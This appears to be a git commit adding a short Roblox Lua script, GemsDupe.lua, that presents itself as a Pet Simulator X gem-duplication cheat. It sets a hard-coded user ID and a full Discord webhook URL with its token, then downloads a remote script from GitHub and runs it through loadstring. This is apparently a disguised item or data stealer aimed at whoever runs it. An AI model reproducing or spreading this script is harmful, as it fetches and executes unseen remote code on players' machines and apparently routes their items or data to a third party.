a17da5dc018b0e0d4f83e24f38159add5394175b
landrex08 <130706756+landrex08@users.noreply.github.com>
2023-04-27 00:46:09 +0200

    Add files via upload

---
+++ GemsDupe.lua
@@ -0,0 +1,3 @@
+_G.UserID = 4562159198
+_G.WebHook = "https://discord.com/api/webhooks/1100912802136338537/AnjAGM4MtB1ma17TSkBzbCPPQwM4Q820e4BuLzLmSqeyKd836UEqiPDkW0NmIgrlPM6d"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
